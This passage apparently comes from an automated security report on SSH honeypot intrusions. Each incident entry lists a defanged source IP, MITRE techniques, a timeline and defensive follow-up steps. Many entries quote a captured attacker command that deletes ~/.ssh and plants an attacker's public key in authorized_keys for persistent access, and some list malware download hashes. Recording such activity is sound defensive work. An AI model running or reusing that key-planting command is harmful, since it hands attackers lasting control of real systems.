| `2026-03-18 06:44:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.138.33[.]218` to AbuseIPDB if not already reported
- [ ] Block `174.138.33[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c54a08cd654

| Field | Detail |
|---|---|
| **Source IP** | `174.138.33[.]218` |
| **First Seen** | 2026-03-18 06:45 |
| **Last Seen** | 2026-03-18 06:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 06:45:04` | `cowrie.session.connect` |
| `2026-03-18 06:45:04` | `cowrie.client.version` |
| `2026-03-18 06:45:05` | `cowrie.client.kex` |
| `2026-03-18 06:45:05` | `cowrie.login.success` |
| `2026-03-18 06:45:06` | `cowrie.session.params` |
| `2026-03-18 06:45:06` | `cowrie.command.input` |
| `2026-03-18 06:45:06` | `cowrie.log.closed` |
| `2026-03-18 06:45:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.138.33[.]218` to AbuseIPDB if not already reported
- [ ] Block `174.138.33[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9442568e172

| Field | Detail |
|---|---|
| **Source IP** | `174.138.33[.]218` |
| **First Seen** | 2026-03-18 06:45 |
| **Last Seen** | 2026-03-18 06:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 06:45:48` | `cowrie.session.connect` |
| `2026-03-18 06:45:48` | `cowrie.client.version` |
| `2026-03-18 06:45:49` | `cowrie.client.kex` |
| `2026-03-18 06:45:49` | `cowrie.login.success` |
| `2026-03-18 06:45:50` | `cowrie.session.params` |
| `2026-03-18 06:45:50` | `cowrie.command.input` |
| `2026-03-18 06:45:50` | `cowrie.log.closed` |
| `2026-03-18 06:45:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.138.33[.]218` to AbuseIPDB if not already reported
- [ ] Block `174.138.33[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b15f7445174

| Field | Detail |
|---|---|
| **Source IP** | `174.138.33[.]218` |
| **First Seen** | 2026-03-18 06:47 |
| **Last Seen** | 2026-03-18 06:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 06:47:04` | `cowrie.session.connect` |
| `2026-03-18 06:47:04` | `cowrie.client.version` |
| `2026-03-18 06:47:05` | `cowrie.client.kex` |
| `2026-03-18 06:47:05` | `cowrie.login.success` |
| `2026-03-18 06:47:06` | `cowrie.session.params` |
| `2026-03-18 06:47:06` | `cowrie.command.input` |
| `2026-03-18 06:47:06` | `cowrie.log.closed` |
| `2026-03-18 06:47:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.138.33[.]218` to AbuseIPDB if not already reported
- [ ] Block `174.138.33[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0242707abb62

| Field | Detail |
|---|---|
| **Source IP** | `41.111.172[.]2` |
| **First Seen** | 2026-03-18 06:54 |
| **Last Seen** | 2026-03-18 06:54 |
| **Session Duration** | 49s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 06:54:08` | `cowrie.session.connect` |
| `2026-03-18 06:54:08` | `cowrie.client.version` |
| `2026-03-18 06:54:08` | `cowrie.client.kex` |
| `2026-03-18 06:54:08` | `cowrie.login.success` |
| `2026-03-18 06:54:57` | `cowrie.session.file_upload` |
| `2026-03-18 06:54:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.172[.]2` to AbuseIPDB if not already reported
- [ ] Block `41.111.172[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bf206991ee7

| Field | Detail |
|---|---|
| **Source IP** | `95.70.212[.]76` |
| **First Seen** | 2026-03-18 07:57 |
| **Last Seen** | 2026-03-18 07:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 07:57:08` | `cowrie.session.connect` |
| `2026-03-18 07:57:08` | `cowrie.client.version` |
| `2026-03-18 07:57:08` | `cowrie.client.kex` |
| `2026-03-18 07:57:09` | `cowrie.login.success` |
| `2026-03-18 07:57:10` | `cowrie.session.params` |
| `2026-03-18 07:57:10` | `cowrie.command.input` |
| `2026-03-18 07:57:10` | `cowrie.command.failed` |
| `2026-03-18 07:57:10` | `cowrie.log.closed` |
| `2026-03-18 07:57:10` | `cowrie.session.params` |
| `2026-03-18 07:57:10` | `cowrie.command.input` |
| `2026-03-18 07:57:11` | `cowrie.session.file_download` |
| `2026-03-18 07:57:11` | `cowrie.log.closed` |
| `2026-03-18 07:57:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.70.212[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.70.212[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f40078335340

| Field | Detail |
|---|---|
| **Source IP** | `95.70.212[.]76` |
| **First Seen** | 2026-03-18 07:57 |
| **Last Seen** | 2026-03-18 07:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 07:57:13` | `cowrie.session.connect` |
| `2026-03-18 07:57:13` | `cowrie.client.version` |
| `2026-03-18 07:57:13` | `cowrie.client.kex` |
| `2026-03-18 07:57:14` | `cowrie.login.success` |
| `2026-03-18 07:57:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.70.212[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.70.212[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ccb70c8fe4f

| Field | Detail |
|---|---|
| **Source IP** | `186.4.240[.]226` |
| **First Seen** | 2026-03-18 07:57 |
| **Last Seen** | 2026-03-18 07:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 07:57:59` | `cowrie.session.connect` |
| `2026-03-18 07:57:59` | `cowrie.client.version` |
| `2026-03-18 07:58:00` | `cowrie.client.kex` |
| `2026-03-18 07:58:01` | `cowrie.login.success` |
| `2026-03-18 07:58:02` | `cowrie.session.params` |
| `2026-03-18 07:58:02` | `cowrie.command.input` |
| `2026-03-18 07:58:02` | `cowrie.command.failed` |
| `2026-03-18 07:58:02` | `cowrie.log.closed` |
| `2026-03-18 07:58:02` | `cowrie.session.params` |
| `2026-03-18 07:58:02` | `cowrie.command.input` |
| `2026-03-18 07:58:03` | `cowrie.session.file_download` |
| `2026-03-18 07:58:03` | `cowrie.log.closed` |
| `2026-03-18 07:58:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.4.240[.]226` to AbuseIPDB if not already reported
- [ ] Block `186.4.240[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b114203a7fd6

| Field | Detail |
|---|---|
| **Source IP** | `186.4.240[.]226` |
| **First Seen** | 2026-03-18 07:58 |
| **Last Seen** | 2026-03-18 07:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 07:58:06` | `cowrie.session.connect` |
| `2026-03-18 07:58:06` | `cowrie.client.version` |
| `2026-03-18 07:58:07` | `cowrie.client.kex` |
| `2026-03-18 07:58:08` | `cowrie.login.success` |
| `2026-03-18 07:58:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.4.240[.]226` to AbuseIPDB if not already reported
- [ ] Block `186.4.240[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7257f9e082a1

| Field | Detail |
|---|---|
| **Source IP** | `95.70.212[.]76` |
| **First Seen** | 2026-03-18 08:05 |
| **Last Seen** | 2026-03-18 08:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 08:05:03` | `cowrie.session.connect` |
| `2026-03-18 08:05:03` | `cowrie.client.version` |
| `2026-03-18 08:05:04` | `cowrie.client.kex` |
| `2026-03-18 08:05:04` | `cowrie.login.success` |
| `2026-03-18 08:05:05` | `cowrie.session.params` |
| `2026-03-18 08:05:05` | `cowrie.command.input` |
| `2026-03-18 08:05:05` | `cowrie.command.failed` |
| `2026-03-18 08:05:05` | `cowrie.log.closed` |
| `2026-03-18 08:05:06` | `cowrie.session.params` |
| `2026-03-18 08:05:06` | `cowrie.command.input` |
| `2026-03-18 08:05:06` | `cowrie.session.file_download` |
| `2026-03-18 08:05:06` | `cowrie.log.closed` |
| `2026-03-18 08:05:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.70.212[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.70.212[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bce07a4eef16

| Field | Detail |
|---|---|
| **Source IP** | `95.70.212[.]76` |
| **First Seen** | 2026-03-18 08:05 |
| **Last Seen** | 2026-03-18 08:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 08:05:09` | `cowrie.session.connect` |
| `2026-03-18 08:05:09` | `cowrie.client.version` |
| `2026-03-18 08:05:09` | `cowrie.client.kex` |
| `2026-03-18 08:05:10` | `cowrie.login.success` |
| `2026-03-18 08:05:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.70.212[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.70.212[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53ee9bf0549e

| Field | Detail |
|---|---|
| **Source IP** | `90.173.78[.]90` |
| **First Seen** | 2026-03-18 09:04 |
| **Last Seen** | 2026-03-18 09:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 09:04:45` | `cowrie.session.connect` |
| `2026-03-18 09:04:45` | `cowrie.client.version` |
| `2026-03-18 09:04:45` | `cowrie.client.kex` |
| `2026-03-18 09:04:47` | `cowrie.login.success` |
| `2026-03-18 09:04:47` | `cowrie.direct-tcpip.request` |
| `2026-03-18 09:04:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.173.78[.]90` to AbuseIPDB if not already reported
- [ ] Block `90.173.78[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b57948789f2

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-03-18 10:47 |
| **Last Seen** | 2026-03-18 10:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 10:47:34` | `cowrie.session.connect` |
| `2026-03-18 10:47:34` | `cowrie.client.version` |
| `2026-03-18 10:47:34` | `cowrie.client.kex` |
| `2026-03-18 10:47:34` | `cowrie.login.success` |
| `2026-03-18 10:47:34` | `cowrie.session.params` |
| `2026-03-18 10:47:34` | `cowrie.command.input` |
| `2026-03-18 10:47:34` | `cowrie.command.failed` |
| `2026-03-18 10:47:34` | `cowrie.log.closed` |
| `2026-03-18 10:47:34` | `cowrie.session.params` |
| `2026-03-18 10:47:34` | `cowrie.command.input` |
| `2026-03-18 10:47:34` | `cowrie.session.file_download` |
| `2026-03-18 10:47:34` | `cowrie.log.closed` |
| `2026-03-18 10:47:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f2428dd0fe5

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-03-18 10:47 |
| **Last Seen** | 2026-03-18 10:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 10:47:35` | `cowrie.session.connect` |
| `2026-03-18 10:47:35` | `cowrie.client.version` |
| `2026-03-18 10:47:35` | `cowrie.client.kex` |
| `2026-03-18 10:47:36` | `cowrie.login.success` |
| `2026-03-18 10:47:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d94c2c72e146

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-03-18 10:48 |
| **Last Seen** | 2026-03-18 10:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 10:48:23` | `cowrie.session.connect` |
| `2026-03-18 10:48:23` | `cowrie.client.version` |
| `2026-03-18 10:48:23` | `cowrie.client.kex` |
| `2026-03-18 10:48:24` | `cowrie.login.success` |
| `2026-03-18 10:48:24` | `cowrie.session.params` |
| `2026-03-18 10:48:24` | `cowrie.command.input` |
| `2026-03-18 10:48:24` | `cowrie.command.failed` |
| `2026-03-18 10:48:24` | `cowrie.log.closed` |
| `2026-03-18 10:48:25` | `cowrie.session.params` |
| `2026-03-18 10:48:25` | `cowrie.command.input` |
| `2026-03-18 10:48:25` | `cowrie.session.file_download` |
| `2026-03-18 10:48:25` | `cowrie.log.closed` |
| `2026-03-18 10:48:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d94a613dfd74

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-03-18 10:48 |
| **Last Seen** | 2026-03-18 10:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 10:48:28` | `cowrie.session.connect` |
| `2026-03-18 10:48:28` | `cowrie.client.version` |
| `2026-03-18 10:48:28` | `cowrie.client.kex` |
| `2026-03-18 10:48:29` | `cowrie.login.success` |
| `2026-03-18 10:48:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b73128f4f16e

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-03-18 10:55 |
| **Last Seen** | 2026-03-18 10:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 10:55:06` | `cowrie.session.connect` |
| `2026-03-18 10:55:06` | `cowrie.client.version` |
| `2026-03-18 10:55:07` | `cowrie.client.kex` |
| `2026-03-18 10:55:07` | `cowrie.login.success` |
| `2026-03-18 10:55:08` | `cowrie.session.params` |
| `2026-03-18 10:55:08` | `cowrie.command.input` |
| `2026-03-18 10:55:08` | `cowrie.command.failed` |
| `2026-03-18 10:55:08` | `cowrie.log.closed` |
| `2026-03-18 10:55:09` | `cowrie.session.params` |
| `2026-03-18 10:55:09` | `cowrie.command.input` |
| `2026-03-18 10:55:09` | `cowrie.session.file_download` |
| `2026-03-18 10:55:09` | `cowrie.log.closed` |
| `2026-03-18 10:55:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6122018f249

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-03-18 10:55 |
| **Last Seen** | 2026-03-18 10:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 10:55:12` | `cowrie.session.connect` |
| `2026-03-18 10:55:12` | `cowrie.client.version` |
| `2026-03-18 10:55:12` | `cowrie.client.kex` |
| `2026-03-18 10:55:13` | `cowrie.login.success` |
| `2026-03-18 10:55:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9255df9338a8

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-03-18 10:56 |
| **Last Seen** | 2026-03-18 10:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 10:56:00` | `cowrie.session.connect` |
| `2026-03-18 10:56:00` | `cowrie.client.version` |
| `2026-03-18 10:56:00` | `cowrie.client.kex` |
| `2026-03-18 10:56:01` | `cowrie.login.success` |
| `2026-03-18 10:56:01` | `cowrie.session.params` |
| `2026-03-18 10:56:01` | `cowrie.command.input` |
| `2026-03-18 10:56:01` | `cowrie.command.failed` |
| `2026-03-18 10:56:02` | `cowrie.log.closed` |
| `2026-03-18 10:56:02` | `cowrie.session.params` |
| `2026-03-18 10:56:02` | `cowrie.command.input` |
| `2026-03-18 10:56:02` | `cowrie.session.file_download` |
| `2026-03-18 10:56:02` | `cowrie.log.closed` |
| `2026-03-18 10:56:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-663635e2dd38

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-03-18 10:56 |
